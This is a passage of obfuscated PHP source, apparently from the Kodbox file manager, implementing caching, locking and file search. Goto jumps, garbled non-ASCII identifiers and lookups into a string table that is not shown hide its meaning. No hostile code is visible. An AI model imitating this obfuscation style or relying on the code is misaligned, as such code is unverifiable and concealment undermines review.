define($_SERVER[ •ŒÓîÆ][657], $_SERVER[ •ŒÓîÆ][658]); $ldrcekmnso = $_SERVER[ •ŒÓîÆ][659]; goto Dˆ‰âï‰ÎÙ; a›ìÊƒÏìÄ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $šå™¾Ş =& $_SERVER[ •ŒÓîÆ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¨Ó‰Ò = $GLOBALS[$šå™¾Ş[6]][$šå™¾Ş[404]]; $€‡èš¯ = $¨Ó‰Ò[$¨Ó‰Ò[$šå™¾Ş[868]]]; $½»‚à = $¨Ó‰Ò[$šå™¾Ş[869]]; switch ($¨Ó‰Ò[$šå™¾Ş[868]]) { case $šå™¾Ş[21]: self::$handle = Model($šå™¾Ş[870]); break; case $šå™¾Ş[871]: self::$handle = new CacheRedis($€‡èš¯, $½»‚à); break; case $šå™¾Ş[872]: self::$handle = new CacheMemcached($€‡èš¯, $½»‚à); break; case $šå™¾Ş[216]: self::$handle = new CacheFile($€‡èš¯, $½»‚à); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($úÖıïİ) { if (is_array($úÖıïİ) || is_object($úÖıïİ)) { $úÖıïİ = json_encode($úÖıïİ); } $úÖıïİ = rawurlencode($úÖıïİ); return md5(KOD_SITE_ID . $_SERVER[ •ŒÓîÆ][11] . $úÖıïİ); } public static function get($áî‰©‡¨, $½õå‚¦ = false) { $ö¡ıìÇ½ = self::key($áî‰©‡¨); $µúØ“ş¬ = self::init(); if ($½õå‚¦) { return unserialize($µúØ“ş¬->get($ö¡ıìÇ½)); } if (!isset(self::$memoryCache[$ö¡ıìÇ½])) { $ğä¸ˆ¢é = $µúØ“ş¬->get($ö¡ıìÇ½); self::$memoryCache[$ö¡ıìÇ½] = unserialize($ğä¸ˆ¢é); } return self::$memoryCache[$ö¡ıìÇ½]; } public static function set($ÌÙ¨·ñ°, $ÄÏ“, $ì™òÏù = false) { $®ùÛî«‚ =& $_SERVER[ •ŒÓîÆ]; $ô ÂóÄ = self::key($ÌÙ¨·ñ°); if (isset(self::$memoryCache[$ô ÂóÄ]) && self::$memoryCache[$ô ÂóÄ] === $ÄÏ“) { return !0; } if ($ì™òÏù === 0) { self::$memoryCache[$ô ÂóÄ] = $ÄÏ“; return !0; } $‰³ ¥©ë = self::init(); $•­¶ı„ä = serialize($ÄÏ“); CacheLock::lock($ÌÙ¨·ñ° . $®ùÛî«‚[873]); $×ŸÀ¶¶ä = $‰³ ¥©ë->set($ô ÂóÄ, $•­¶ı„ä, $ì™òÏù); self::$memoryCache[$ô ÂóÄ] = $ÄÏ“; CacheLock::unlock($ÌÙ¨·ñ° . $®ùÛî«‚[873]); return $×ŸÀ¶¶ä; } public static function getCall($§ü£¢×ô, $ˆå¿§ø, $™š€Ò®, $¿ä•”ÊÉ = array()) { $æÀåäÂÆ =& $_SERVER[ •ŒÓîÆ]; $ƒöµëä± = self::get($§ü£¢×ô); if ($ƒöµëä± || $ƒöµëä± === $æÀåäÂÆ[12]) { return $ƒöµëä±; } $ƒöµëä± = call_user_func_array($™š€Ò®, $¿ä•”ÊÉ); $ƒöµëä± = $ƒöµëä± ? $ƒöµëä± : $æÀåäÂÆ[12]; self::set($§ü£¢×ô, $ƒöµëä±, $ˆå¿§ø); return $ƒöµëä±; } public static function remove($¼ÛÆ±Ì‰) { $æÉ ¶†Ò = self::key($¼ÛÆ±Ì‰); unset(self::$memoryCache[$æÉ ¶†Ò]); self::clearTimeout(); CacheLock::lock($¼ÛÆ±Ì‰); $µ¸’ï „ = self::init()->remove($æÉ ¶†Ò); CacheLock::unlock($¼ÛÆ±Ì‰); return $µ¸’ï „; } public static function removeMemory($°÷èÉ¾ß) { $¬¯ŞÇ = self::key($°÷èÉ¾ß); unset(self::$memoryCache[$¬¯ŞÇ]); } public static function clearMemory($şÜ¾¥Ø… = false) { if ($şÜ¾¥Ø…) { $şÜ¾¥Ø… = self::key($şÜ¾¥Ø…); unset(self::$memoryCache[$şÜ¾¥Ø…]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ •ŒÓîÆ][874])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ •ŒÓîÆ][875])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¥Ë±·š, $˜² —Ù”) { $¹¶”Ëşª =& $_SERVER[ •ŒÓîÆ]; $this->cachePath = $¥Ë±·š[$¹¶”Ëşª[86]]; $this->prefix = $¹¶”Ëşª[876]; $this->cacheTime = $˜² —Ù”; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($½®×Ï«‘) { $†±öòÜº =& $_SERVER[ •ŒÓîÆ]; $½®×Ï«‘ = str_replace(array($†±öòÜº[877], $†±öòÜº[99], $†±öòÜº[75]), $†±öòÜº[878], $½®×Ï«‘); return $this->cachePath . $†±öòÜº[879] . $½®×Ï«‘ . $†±öòÜº[880]; } public function set($Èò„ºùÙ, $¤ß†‘Ç, $ü÷ÙÚ = false) { $ü÷ÙÚ = $ü÷ÙÚ ? $ü÷ÙÚ : $this->cacheTime; $½Ÿ…á»é = $this->getFile($Èò„ºùÙ); if (file_put_contents($½Ÿ…á»é, $this->prefix . $¤ß†‘Ç, LOCK_EX)) { @touch($½Ÿ…á»é, intval(time() + $ü÷ÙÚ)); clearstatcache(); return !0; } @unlink($½Ÿ…á»é); return !1; } public function get($óÄ°€Ğü) { $ù—…¡‹ö = $this->getFile($óÄ°€Ğü); if (file_exists($ù—…¡‹ö) && filemtime($ù—…¡‹ö) < time()) { @unlink($ù—…¡‹ö); return !1; } $Îó˜öïİ = @file_get_contents($ù—…¡‹ö); return substr($Îó˜öïİ, strlen($this->prefix)); } public function remove($ÈÄ¦†…ó) { $âÃ¡”®œ = $this->getFile($ÈÄ¦†…ó); return @unlink($âÃ¡”®œ); } public function deleteAll() { $Õ§‰×á =& $_SERVER[ •ŒÓîÆ]; $è¬å¦¾ø = scandir($this->cachePath); foreach ($è¬å¦¾ø as $Ûôê…Ğº) { $îÒ±Ë€ = $this->cachePath . $Ûôê…Ğº; if (strpos($îÒ±Ë€, $Õ§‰×á[880]) && strpos($îÒ±Ë€, $Õ§‰×á[881])) { @unlink($îÒ±Ë€); } } } public function clearTimeout() { $İâ¶‹éû =& $_SERVER[ •ŒÓîÆ]; $­²€ÕÒ˜ = scandir($this->cachePath); foreach ($­²€ÕÒ˜ as $óÜø«§‚) { $–Çàîõ = $this->cachePath . $óÜø«§‚; if (strpos($–Çàîõ, $İâ¶‹éû[880]) && strpos($–Çàîõ, $İâ¶‹éû[881]) && filemtime($–Çàîõ) < time()) { @unlink($–Çàîõ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ñœÎóôü =& $_SERVER[ •ŒÓîÆ]; if (self::$handle) { return self::$handle; } $¤ˆšÜã¦ = $GLOBALS[$ñœÎóôü[6]][$ñœÎóôü[404]]; self::$timeout = $¤ˆšÜã¦[$ñœÎóôü[882]] ? $¤ˆšÜã¦[$ñœÎóôü[882]] : 10; $òù¡÷·® = _get($GLOBALS[$ñœÎóôü[6]], $ñœÎóôü[883]); $¯»Ÿ“„‡ = $¤ˆšÜã¦[$ñœÎóôü[868]] ? $¤ˆšÜã¦[$ñœÎóôü[868]] : $ñœÎóôü[216]; if ($¯»Ÿ“„‡ == $ñœÎóôü[21] && $òù¡÷·® == $ñœÎóôü[13]) { $¯»Ÿ“„‡ = $ñœÎóôü[216]; } switch ($¯»Ÿ“„‡) { case $ñœÎóôü[871]: self::$handle = new CacheLockRedis(); break; case $ñœÎóôü[872]: self::$handle = new CacheLockMemcached(); break; case $ñœÎóôü[21]: self::$handle = new CacheLockDatabase(); break; case $ñœÎóôü[216]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ñœÎóôü[884], $ñœÎóôü[885]); } return self::$handle; } private static function key($ˆÀ¯ˆ“¹) { return $_SERVER[ •ŒÓîÆ][886] . Cache::key($ˆÀ¯ˆ“¹); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Öèòô = '') { self::$errorMsg = $Öèòô; } public static function lockGlobal($‚–€ µ±, $Ôıã¹†Ë) { return self::lock($‚–€ µ±, $Ôıã¹†Ë, !0); } public static function lock($¬•¦¬, $ü¾‰Œğ = false, $ªÏ¶ÕòÖ = false) { $ù÷Ûó =& $_SERVER[ •ŒÓîÆ]; $Ê·—Õà£ = self::init(); $ôÌßÄ¥… = self::key($¬•¦¬); $ü¾‰Œğ = $ü¾‰Œğ ? $ü¾‰Œğ : self::$timeout; $æĞ‡ŠÂÍ = timeFloat(); $¶À‰Ô£Ä = $Ê·—Õà£->lock($ôÌßÄ¥…, $ü¾‰Œğ); $‚ü¼à = timeFloat(); if (!$¶À‰Ô£Ä) { $íŠÆØÊ = "\154\157\143\x6b\40\145\162\162\157\x72\x3b\153\145\x79\x3d{$¬•¦¬}\x3b\x74\x69\155\x65\x3d{$ü¾‰Œğ}\x3b" . self::$errorMsg . $ù÷Ûó[73] . get_caller_msg(); $±î„¶ÎÙ = LNG($ù÷Ûó[887]) . "\50{$ü¾‰Œğ}\x73\x29\x2e" . LNG($ù÷Ûó[888]); $±î„¶ÎÙ .= $ù÷Ûó[889]; if (is_string(self::$errorMsg) && self::$errorMsg) { $±î„¶ÎÙ = $±î„¶ÎÙ . $ù÷Ûó[890] . self::$errorMsg; } write_log($ù÷Ûó[891] . sprintf($ù÷Ûó[892], timeFloat() - $æĞ‡ŠÂÍ) . $ù÷Ûó[893] . $íŠÆØÊ . $ù÷Ûó[894] . error_get_last(), $ù÷Ûó[885]); show_json($±î„¶ÎÙ, !1); } if (!$ªÏ¶ÕòÖ) { self::$lockItem[$ôÌßÄ¥…] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Å±·™İÍ = number_format(timeFloat() - $‚ü¼à, 3); write_log($ù÷Ûó[895] . $¬•¦¬ . $ù÷Ûó[896] . $Å±·™İÍ, $ù÷Ûó[885]); } return $¶À‰Ô£Ä; } public static function lockGet($Í’Š¶¶) { $Ö½œë¢ì = self::key($Í’Š¶¶); if (self::$lockItem[$Ö½œë¢ì]) { return self::$lockItem[$Ö½œë¢ì]; } return self::init()->lockGet($Ö½œë¢ì); } public static function unlock($š¡’”‚ß) { $ßöïÃúş =& $_SERVER[ •ŒÓîÆ]; $ßøû™çò = self::key($š¡’”‚ß); self::$lockItem[$ßøû™çò] = null; self::init()->unlock($ßøû™çò); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ßöïÃúş[897] . $š¡’”‚ß, $ßöïÃúş[885]); } return; } public static function unlockRuntime() { $Í£Ïºš„ =& $_SERVER[ •ŒÓîÆ]; $Û—âö˜¹ = self::init(); $Àèåßã = !1; foreach (self::$lockItem as $‡¯üÊÒ× => $Øç†ğú) { if (!$Øç†ğú) { continue; } $Û—âö˜¹->unlock($‡¯üÊÒ×); if (!$Àèåßã) { $Àèåßã = !0; write_log($Í£Ïºš„[898] . $‡¯üÊÒ× . $Í£Ïºš„[73] . get_caller_msg(), $Í£Ïºš„[885]); continue; } write_log($Í£Ïºš„[898] . $‡¯üÊÒ×, $Í£Ïºš„[885]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ºû¾×‚ã = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Í£Ïºš„[899] . $ºû¾×‚ã . $Í£Ïºš„[900] . ACTION, $Í£Ïºš„[885]); } } public static function fileLock($°ë›€©í) { $¬ªˆŞ¼ß =& $_SERVER[ •ŒÓîÆ]; if (!$GLOBALS[$¬ªˆŞ¼ß[901]]) { $GLOBALS[$¬ªˆŞ¼ß[901]] = array(); } $GLOBALS[$¬ªˆŞ¼ß[901]][$°ë›€©í] = !1; $óÀÛ¶¤ = fopen(DATA_PATH . $°ë›€©í . $¬ªˆŞ¼ß[902], $¬ªˆŞ¼ß[903]); if (!$óÀÛ¶¤) { return !1; } $GLOBALS[$¬ªˆŞ¼ß[901]][$°ë›€©í] = $óÀÛ¶¤; if (flock($óÀÛ¶¤, LOCK_EX)) { return !0; } self::unlock($°ë›€©í); show_json($¬ªˆŞ¼ß[904], !1); return !1; } public static function fileUnlock($ÉáİŒùº) { $ä©÷ÅÖ =& $_SERVER[ •ŒÓîÆ]; $°ş”À¥ = $GLOBALS[$ä©÷ÅÖ[901]][$ÉáİŒùº]; if (!$°ş”À¥) { return; } $GLOBALS[$ä©÷ÅÖ[901]][$ÉáİŒùº] = !1; flock($°ş”À¥, LOCK_UN); fclose($°ş”À¥); } public static function fileUnlockAll() { $Ç¡˜ãÈÖ =& $_SERVER[ •ŒÓîÆ]; if (!$GLOBALS[$Ç¡˜ãÈÖ[901]]) { return; } foreach ($GLOBALS[$Ç¡˜ãÈÖ[901]] as $°‘ª˜† => $ê£ üğ¶) { if (!$ê£ üğ¶) { continue; } $GLOBALS[$Ç¡˜ãÈÖ[901]][$°‘ª˜†] = !1; flock($ê£ üğ¶, LOCK_UN); fclose($ê£ üğ¶); } $GLOBALS[$Ç¡˜ãÈÖ[901]] = array(); } } goto f‚ßšÆ¾­°; E¦ä²Å¸…³: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¬äíŒ) { $ã÷è¼ÊĞ =& $_SERVER[ •ŒÓîÆ]; $¬Ô½÷ê = KodIO::fileTypeList(); $—ÅØÏ˜ó = $¬Ô½÷ê[$¬äíŒ]; if (!$—ÅØÏ˜ó) { return array(); } $¶¾§‰”æ = $—ÅØÏ˜ó[$ã÷è¼ÊĞ[177]]; $Ü³î¨’ = $ã÷è¼ÊĞ[7]; if (!$—ÅØÏ˜ó[$ã÷è¼ÊĞ[177]]) { $ë±–†Ùï = array_to_keyvalue($¬Ô½÷ê, $ã÷è¼ÊĞ[12], $ã÷è¼ÊĞ[177]); $¶¾§‰”æ = implode($ã÷è¼ÊĞ[50], $ë±–†Ùï); $Ü³î¨’ = $ã÷è¼ÊĞ[2144]; } $ÆÊ´™—€ = explode($ã÷è¼ÊĞ[50], trim($¶¾§‰”æ, $ã÷è¼ÊĞ[50])); return array($Ü³î¨’, $ÆÊ´™—€); } public function listPathType($×ãØ‚Ù) { $Òõçá¯ª =& $_SERVER[ •ŒÓîÆ]; $¡õÌÖ‘ = $this->fileTypeWhere($×ãØ‚Ù); if (!$¡õÌÖ‘) { return array(); } $×Ë¢‘·… = USER_ID; $Ú±ƒÎé = Model($Òõçá¯ª[579])->getInfo($×Ë¢‘·…); $—‹„À¡„ = array($Òõçá¯ª[628] => SourceModel::TYPE_USER, $Òõçá¯ª[565] => array($Òõçá¯ª[592], $Òõçá¯ª[575] . $Ú±ƒÎé[$Òõçá¯ª[89]][$Òõçá¯ª[183]] . $Òõçá¯ª[593]), $Òõçá¯ª[629] => $×Ë¢‘·…, $Òõçá¯ª[626] => 0, $Òõçá¯ª[627] => $¡õÌÖ‘); return $this->listSource($—‹„À¡„); } public function listSearch($‘ºèáğß, $¥¥¤®ñ = 300) { $±¤÷Šó“ =& $_SERVER[ •ŒÓîÆ]; if (isset($‘ºèáğß[$±¤÷Šó“[1982]]) && $‘ºèáğß[$±¤÷Šó“[1982]]) { $‘ºèáğß[$±¤÷Šó“[1982]] = str_replace($±¤÷Šó“[438], $±¤÷Šó“[2145], trim($‘ºèáğß[$±¤÷Šó“[1982]])); } $ÀãÈ×ü˜ = $this->_parseSearchWhere($‘ºèáğß); if (!isset($ÀãÈ×ü˜[$±¤÷Šó“[484]])) { $ÀãÈ×ü˜[$±¤÷Šó“[484]] = 0; } $Ú›ÛåÂ‡ = $±¤÷Šó“[2146]; $šÔ ³ò– = $ÀãÈ×ü˜; $Ú¤£¡­é = $Ú›ÛåÂ‡; $this->_listSearchBindPinyin($‘ºèáğß, $ÀãÈ×ü˜, $Ú›ÛåÂ‡); $this->alias($±¤÷Šó“[498])->_makeOrder(); $ÀãÈ×ü˜ = $this->parseWhereLike($ÀãÈ×ü˜); $ö»ê¸º” = $this->distinct(!0)->field($Ú›ÛåÂ‡)->where($ÀãÈ×ü˜)->selectPage($¥¥¤®ñ); if ($GLOBALS[$±¤÷Šó“[6]][$±¤÷Šó“[435]][$±¤÷Šó“[436]] && Input::check($‘ºèáğß[$±¤÷Šó“[1982]], $±¤÷Šó“[635]) && $ö»ê¸º”[$±¤÷Šó“[421]][$±¤÷Šó“[408]] == 1 && $ö»ê¸º”[$±¤÷Šó“[421]][$±¤÷Šó“[422]] == 0) { $ö»ê¸º” = $this->distinct(!0)->field($Ú›ÛåÂ‡)->where($šÔ ³ò–)->limit(1000)->select(); $ö»ê¸º” = array_page_split($ö»ê¸º”, !1, $¥¥¤®ñ); } $this->_listSearchFileContent($ö»ê¸º”, $‘ºèáğß, $Ú¤£¡­é, $šÔ ³ò–); $this->_listSearchDesc($ö»ê¸º”, $‘ºèáğß, $Ú¤£¡­é); $this->_listSearchTag($ö»ê¸º”, $‘ºèáğß, $Ú¤£¡­é); $this->_listSearchGroupTag($ö»ê¸º”, $‘ºèáğß, $Ú¤£¡­é); $this->_listDataApply($ö»ê¸º”[$±¤÷Šó“[424]]); $this->_listMake($ö»ê¸º”); return $ö»ê¸º”; } private function _listSearchFileContent(&$¬¸ëÅí, $Öƒì“í›, $õäİ»³¤, $ëãùÍªÆ) { $ªãìÓ¿ =& $_SERVER[ •ŒÓîÆ]; if (!$Öƒì“í›[$ªãìÓ¿[1982]] || $¬¸ëÅí[$ªãìÓ¿[421]][$ªãìÓ¿[408]] > 1) { return; } if (!isset($ëãùÍªÆ[$ªãìÓ¿[32]]) || !is_array($Öƒì“í›[$ªãìÓ¿[520]])) { return; } $ëãùÍªÆ[$ªãìÓ¿[520]] = array($ªãìÓ¿[7], $Öƒì“í›[$ªãìÓ¿[520]]); unset($ëãùÍªÆ[$ªãìÓ¿[32]]); unset($Öƒì“í›[$ªãìÓ¿[520]]); $Œ”Ñíú = $this->field($õäİ»³¤)->where($ëãùÍªÆ)->limit($ªãìÓ¿[2147])->select(); if (!$Œ”Ñíú || count($Œ”Ñíú) == 0) { return; } $¬¸ëÅí[$ªãìÓ¿[424]] = array_merge($Œ”Ñíú, $¬¸ëÅí[$ªãìÓ¿[424]]); $¬¸ëÅí[$ªãìÓ¿[421]][$ªãìÓ¿[422]] += count($Œ”Ñíú); } private function _listSearchTag(&$«Éôëê, $˜ Óïü, $¢ı’ÂŒä) { $ãäîı„Ö =& $_SERVER[ •ŒÓîÆ]; if (!$˜ Óïü[$ãäîı„Ö[1982]] || $«Éôëê[$ãäîı„Ö[421]][$ãäîı„Ö[408]] > 1) { return; } $÷é¯¸øÃ = Model($ãäîı„Ö[2148])->listData(); $»™Íæåè = array(); $¡úÀíé÷ = $˜ Óïü[$ãäîı„Ö[1982]]; foreach ($÷é¯¸øÃ as $ïÒè¢ı‹) { $¸‹¼Ô = $ïÒè¢ı‹[$ãäîı„Ö[32]]; $¥¢À—®í = str_replace($ãäîı„Ö[53], $ãäîı„Ö[12], Pinyin::get($¸‹¼Ô)); if (stripos($¸‹¼Ô, $¡úÀíé÷) !== !1 || stripos($¥¢À—®í, $¡úÀíé÷) !== !1) { $»™Íæåè[] = $ïÒè¢ı‹[$ãäîı„Ö[453]]; } } if (!$»™Íæåè) { return; } $¦‹Û°³´ = array($ãäîı„Ö[479] => array($ãäîı„Ö[7], $»™Íæåè), $ãäîı„Ö[1690] => USER_ID); $âµ½¸Ö = Model($ãäîı„Ö[481])->field($ãäîı„Ö[86])->where($¦‹Û°³´)->select(); $âµ½¸Ö = array_to_keyvalue($âµ½¸Ö, $ãäîı„Ö[12], $ãäîı„Ö[86]); $¸öƒäÏ = array_unique($âµ½¸Ö); $this->_listSearchMerge($«Éôëê, $˜ Óïü, $¢ı’ÂŒä, $¸öƒäÏ); } private function _listSearchDesc(&$ëã¦½€Ë, $Ãƒ„®Ùù, $«ñíïİ£) { $èŠ“¤‘¢ =& $_SERVER[ •ŒÓîÆ]; if (!$Ãƒ„®Ùù[$èŠ“¤‘¢[1982]] || $ëã¦½€Ë[$èŠ“¤‘¢[421]][$èŠ“¤‘¢[408]] > 1) { return; } $¶†•Š«á = array($èŠ“¤‘¢[96] => $èŠ“¤‘¢[505], $èŠ“¤‘¢[429] => array($èŠ“¤‘¢[437], $èŠ“¤‘¢[1984] . $Ãƒ„®Ùù[$èŠ“¤‘¢[1982]] . $èŠ“¤‘¢[1984])); $Ÿ¸Û²¼Ü = !1; if ($Ÿ¸Û²¼Ü) { $Ú‹øæİ¦ = $this->listSearchChildren($Ãƒ„®Ùù[$èŠ“¤‘¢[182]]); $Ú‹øæİ¦ = array_unique($Ú‹øæİ¦); if (!$Ú‹øæİ¦) { return; } $¶†•Š«á[$èŠ“¤‘¢[183]] = array($èŠ“¤‘¢[7], $Ú‹øæİ¦); } $‚ì¦„áˆ = Model($èŠ“¤‘¢[612])->field($èŠ“¤‘¢[183])->where($¶†•Š«á)->limit(5000)->select(); $ğ¿ÆşÀ“ = array_to_keyvalue($‚ì¦„áˆ, $èŠ“¤‘¢[12], $èŠ“¤‘¢[183]); $this->_listSearchMerge($ëã¦½€Ë, $Ãƒ„®Ùù, $«ñíïİ£, $ğ¿ÆşÀ“); } private function _listSearchGroupTag(&$»”ğ‰ëâ, $—‡·€„¯, $ñØ…) { $¦Ñ¼ñª =& $_SERVER[ •ŒÓîÆ]; if (!$—‡·€„¯[$¦Ñ¼ñª[1982]] || $»”ğ‰ëâ[$¦Ñ¼ñª[421]][$¦Ñ¼ñª[408]] > 1 || !$—‡·€„¯[$¦Ñ¼ñª[182]]) { return; } $×‚ºÎâ¥ = $this->sourceInfo($—‡·€„¯[$¦Ñ¼ñª[182]]); if (!$×‚ºÎâ¥ || $×‚ºÎâ¥[$¦Ñ¼ñª[180]] != SourceModel::TYPE_GROUP) { return; } $±ó£şúÒ = $×‚ºÎâ¥[$¦Ñ¼ñª[550]]; $³ìÉôÍ = Model($¦Ñ¼ñª[2149])->get($±ó£şúÒ); $é¦ Ôó = array(); $¬Ğ£ûÃÆ = $—‡·€„¯[$¦Ñ¼ñª[1982]]; foreach ($³ìÉôÍ[$¦Ñ¼ñª[424]] as $à¥¼»¦„) { $‹Õ»‡“† = $à¥¼»¦„[$¦Ñ¼ñª[32]]; $Øæ×‰û = str_replace($¦Ñ¼ñª[53], $¦Ñ¼ñª[12], Pinyin::get($‹Õ»‡“†)); if (stripos($‹Õ»‡“†, $¬Ğ£ûÃÆ) !== !1 || stripos($Øæ×‰û, $¬Ğ£ûÃÆ) !== !1) { $é¦ Ôó[] = $à¥¼»¦„[$¦Ñ¼ñª[453]]; } } if (!$é¦ Ôó) { return; } $¬ĞÎº½¡ = array($¦Ñ¼ñª[479] => array($¦Ñ¼ñª[7], $é¦ Ôó), $¦Ñ¼ñª[1690] => 0, $¦Ñ¼ñª[33] => $¦Ñ¼ñª[2004] . $±ó£şúÒ); $›Ë¨ßŠÈ = Model($¦Ñ¼ñª[481])->field($¦Ñ¼ñª[86])->where($¬ĞÎº½¡)->select(); $›Ë¨ßŠÈ = array_to_keyvalue($›Ë¨ßŠÈ, $¦Ñ¼ñª[12], $¦Ñ¼ñª[86]); $ò’¾Û®Ë = array_unique($›Ë¨ßŠÈ); $this->_listSearchMerge($»”ğ‰ëâ, $—‡·€„¯, $ñØ…, $ò’¾Û®Ë); } private function _listSearchMerge(&$¡â³»ñ, $Š³ÛÓí×, $ßÓ·šĞ¼, $õñ«Ì¥ã) { $šû„´œõ =& $_SERVER[ •ŒÓîÆ]; if (!$õñ«Ì¥ã) { return; } $¦µ©‚¦¶ = array_to_keyvalue($¡â³»ñ[$šû„´œõ[424]], $šû„´œõ[12], $šû„´œõ[183]); $”¥¬—¼ = array_diff($õñ«Ì¥ã, $¦µ©‚¦¶); if (!$”¥¬—¼) { return; } $­Ì›ÆÛŞ = array($šû„´œõ[183] => array($šû„´œõ[7], $”¥¬—¼)); $˜çŠÚı– = $this->field($ßÓ·šĞ¼)->where($­Ì›ÆÛŞ)->select(); if (!$˜çŠÚı–) { return; } $“ØÒºô› = array(); foreach ($˜çŠÚı– as $Œ¨¹ò›) { if ($this->_listSearchFilter($Œ¨¹ò›, $Š³ÛÓí×)) { $“ØÒºô›[] = $Œ¨¹ò›; } } $¡â³»ñ[$šû„´œõ[424]] = array_merge($“ØÒºô›, $¡â³»ñ[$šû„´œõ[424]]); $¡â³»ñ[$šû„´œõ[421]][$šû„´œõ[422]] += count($“ØÒºô›); } private function _listSearchFilter($Ôƒ¤ÀÚê, $†€ÖÉÖ) { $Ø šáİ =& $_SERVER[ •ŒÓîÆ]; $ÙêåÓÊá = $Ôƒ¤ÀÚê[$Ø šáİ[464]] == $Ø šáİ[90]; if (!strstr($Ôƒ¤ÀÚê[$Ø šáİ[565]], $Ø šáİ[50] . $†€ÖÉÖ[$Ø šáİ[182]] . $Ø šáİ[50])) { return !1; } if (isset($†€ÖÉÖ[$Ø šáİ[465]]) && $†€ÖÉÖ[$Ø šáİ[465]] != $Ø šáİ[1943]) { if ($†€ÖÉÖ[$Ø šáİ[465]] == $Ø šáİ[77] && !$ÙêåÓÊá) { return !1; } if ($†€ÖÉÖ[$Ø šáİ[465]] != $Ø šáİ[77] && $ÙêåÓÊá) { return !1; } if (!strstr($Ôƒ¤ÀÚê[$Ø šáİ[177]], $Ø šáİ[50] . $†€ÖÉÖ[$Ø šáİ[465]] . $Ø šáİ[50])) { return !1; } } if (isset($†€ÖÉÖ[$Ø šáİ[2150]]) && $†€ÖÉÖ[$Ø šáİ[2150]] < $Ôƒ¤ÀÚê[$Ø šáİ[78]]) { return !1; } if (isset($†€ÖÉÖ[$Ø šáİ[2151]]) && $†€ÖÉÖ[$Ø šáİ[2151]] > $Ôƒ¤ÀÚê[$Ø šáİ[78]]) { return !1; } if (isset($†€ÖÉÖ[$Ø šáİ[642]]) && $†€ÖÉÖ[$Ø šáİ[642]] != $Ôƒ¤ÀÚê[$Ø šáİ[508]]) { return !1; } return !0; } public function listSearchChildren($Å’ì“Š, $äèî¨Š„ = 5000) { $£¡Ê†‰ˆ =& $_SERVER[ •ŒÓîÆ]; $³³®‚›ï = array(); $êôÖ¦Ì™ = $this->sourceInfo($Å’ì“Š); $ó¯åš¬¿ = array($£¡Ê†‰ˆ[565] => array($£¡Ê†‰ˆ[437], $êôÖ¦Ì™[$£¡Ê†‰ˆ[565]] . $êôÖ¦Ì™[$£¡Ê†‰ˆ[183]] . $£¡Ê†‰ˆ[593])); $º¶ïØŸÎ = $this->field($£¡Ê†‰ˆ[78])->where($ó¯åš¬¿)->limit($äèî¨Š„ + 1)->select(); $îÓÓñ¬© = is_array($º¶ïØŸÎ) ? count($º¶ïØŸÎ) : 0; if ($îÓÓñ¬© > $äèî¨Š„) { return $this->_listSearchChildrenNear($Å’ì“Š, $äèî¨Š„); } $ã¤¾Ï¾ = $this->field($£¡Ê†‰ˆ[183])->where($ó¯åš¬¿)->select(); $³³®‚›ï = array_to_keyvalue($ã¤¾Ï¾, $£¡Ê†‰ˆ[12], $£¡Ê†‰ˆ[183]); return $³³®‚›ï; } private function _listSearchChildrenNear($¢Ø–şÉ‚, $ßˆ“) { $§Ş¬«¥İ =& $_SERVER[ •ŒÓîÆ]; $¶šï¢†Ÿ = array(); $ò“İ•‹ = array($§Ş¬«¥İ[182] => $¢Ø–şÉ‚); $²áÎ¸Ñ = $this->field($§Ş¬«¥İ[2152])->where($ò“İ•‹)->select(); $Õ»ˆ‚‚¿ = array_to_keyvalue(array_filter_by_field($²áÎ¸Ñ, $§Ş¬«¥İ[464], $§Ş¬«¥İ[90]), $§Ş¬«¥İ[12], $§Ş¬«¥İ[183]); $¶šï¢†Ÿ = array_merge($¶šï¢†Ÿ, array_to_keyvalue($²áÎ¸Ñ, $§Ş¬«¥İ[12], $§Ş¬«¥İ[183])); if (!$Õ»ˆ‚‚¿) { return $¶šï¢†Ÿ; } $ò“İ•‹ = array($§Ş¬«¥İ[182] => array($§Ş¬«¥İ[7], $Õ»ˆ‚‚¿)); $²áÎ¸Ñ = $this->field($§Ş¬«¥İ[2152])->where($ò“İ•‹)->limit($ßˆ“)->select(); $¶šï¢†Ÿ = array_merge($¶šï¢†Ÿ, array_to_keyvalue($²áÎ¸Ñ, $§Ş¬«¥İ[12], $§Ş¬«¥İ[183])); $¶šï¢†Ÿ = array_slice($¶šï¢†Ÿ, 0, intval($ßˆ“)); return $¶šï¢†Ÿ; } private function _listSearchBindPinyin($‹ø‰ğ¡, &$ŞÆêàøÉ, &$õšºµ™÷) { $½•Ú´‘Š =& $_SERVER[ •ŒÓîÆ]; if (!isset($‹ø‰ğ¡[$½•Ú´‘Š[1982]]) || !$‹ø‰ğ¡[$½•Ú´‘Š[1982]]) { return; } if (!Input::check($‹ø‰ğ¡[$½•Ú´‘Š[1982]], $½•Ú´‘Š[373]) || strlen($‹ø‰ğ¡[$½•Ú´‘Š[1982]]) < 2) { return; } $‚üÚ€¤Ñ = "\114\105\x46\124\x20\x4a\117\111\x4e\40{$this->tablePrefix}\x69\x6f\137\x73\x6f\x75\x72\x63\145\x5f\x6d\145\164\141\x20\x6d\145\x74\141\40\157\156\x20\x73\157\x75\162\x63\145\56\163\x6f\165\x72\x63\x65\x49\104\x20\x3d\x20\x6d\145\164\x61\x2e\x73\x6f\x75\x72\143\145\111\x44"; $ò±³â—× = array(); $õšºµ™÷ = str_replace(array($½•Ú´‘Š[248], $½•Ú´‘Š[53], $½•Ú´‘Š[2153]), 